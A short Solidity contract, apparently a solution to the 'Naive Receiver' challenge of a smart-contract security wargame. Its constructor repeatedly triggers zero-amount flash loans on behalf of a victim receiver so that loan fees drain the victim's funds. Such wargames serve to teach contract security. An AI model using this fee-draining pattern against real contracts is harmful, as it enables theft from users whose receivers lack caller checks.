// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../naive-receiver/FlashLoanReceiver.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

interface IPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

contract AttackNaiveReceiver {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    constructor(address pool, address victim) {
        for (uint8 i = 0; i < 10; i++) {
            IPool(pool).flashLoan(victim, ETH, 0, "0x");
        }
    }
}
